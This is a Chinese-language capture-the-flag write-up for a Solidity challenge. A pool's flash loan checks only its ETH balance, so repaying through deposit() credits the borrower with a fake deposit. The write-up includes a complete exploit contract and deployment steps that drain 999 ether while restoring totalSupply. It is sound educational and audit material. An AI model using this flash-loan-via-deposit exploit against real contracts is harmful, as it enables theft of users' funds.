# theft

## 题目简述

`Setup` 在部署时把收到的 $1000\ \mathrm{ether}$ 存入 `Pool`。通关条件为：

```solidity
TARGET.totalSupply() == 1000 ether &&
address(TARGET).balance < 10 ether
```

目标是在不破坏 `totalSupply` 最终值的前提下，从池中取走至少 $991\ \mathrm{ether}$。

## 解题过程

### 1. 分析错误的闪电贷还款检查

`flashLoan` 在回调前后只比较池合约的 ETH 余额：

```solidity
uint256 balanceBefore = address(this).balance;
FlashLoanReceiver(msg.sender).execute{value: amount}();
require(address(this).balance >= balanceBefore, "no money back");
```

回调收到贷款后，如果不直接转账还款，而是调用 `deposit{value: amount}()`，同一笔 ETH 仍会回到池中，所以余额检查可以通过。但 `deposit` 还会额外执行：

```solidity
balances[msg.sender] += msg.value;
totalSupply += msg.value;
```

于是攻击合约虽然没有实际净投入，却获得了等额的内部存款余额，`totalSupply` 也被虚增。漏洞本质是池子只检查“钱是否回来了”，却没有区分“偿还贷款”和“新增存款”这两种会计含义。

### 2. 构造存款余额并一次性提取

单次贷款上限为 $100\ \mathrm{ether}$。连续借出并存回 $9\times100+99=999\ \mathrm{ether}$ 后，状态变为：

- 池子的真实 ETH 余额仍为 $1000\ \mathrm{ether}$；
- 攻击合约的 `balances` 余额为 $999\ \mathrm{ether}$；
- `totalSupply` 被虚增到 $1999\ \mathrm{ether}$。

随后调用 `withdraw()`。池子向攻击合约转出 $999\ \mathrm{ether}$，同时从 `totalSupply` 中减去同样的数值，因此最终有：

$$
\text{Pool balance}=1000-999=1\ \mathrm{ether}
$$

$$
\text{totalSupply}=1999-999=1000\ \mathrm{ether}
$$

两个通关条件同时满足。

完整利用合约如下。`withdraw()` 向攻击合约执行空 calldata 的 ETH 转账，因此还必须实现 `receive()`，否则转账会回滚。

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract Exploit {
    IPool public immutable pool;

    constructor(address target) {
        pool = IPool(target);
    }

    function attack() external {
        for (uint256 i = 0; i < 9; ++i) {
            pool.flashLoan(100 ether);
        }
        pool.flashLoan(99 ether);
        pool.withdraw();
    }

    function execute() external payable {
        require(msg.sender == address(pool), "only pool");
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
```

部署流程如下：

1. 从题目实例的 `Setup.TARGET()` 读取 `Pool` 地址；
2. 以该地址作为构造参数部署 `Exploit`；
3. 调用 `attack()`；
4. 再调用 `Setup.isSolved()`，返回值应为 `true`，随后从比赛平台领取 flag。

仓库源码没有保存平台实际下发的 flag 字符串，因此这里不虚构具体 flag。

## 方法总结

审计闪电贷时不能只看资产是否回到合约，还要检查还款路径是否会同时获得存款份额、凭证或其他权益。本题通过 `deposit` 归还贷款，让同一笔资金既满足余额校验又被记作攻击者存款；最后 `withdraw` 同时降低真实余额和虚增的 `totalSupply`，精确恢复检查所要求的账面状态。
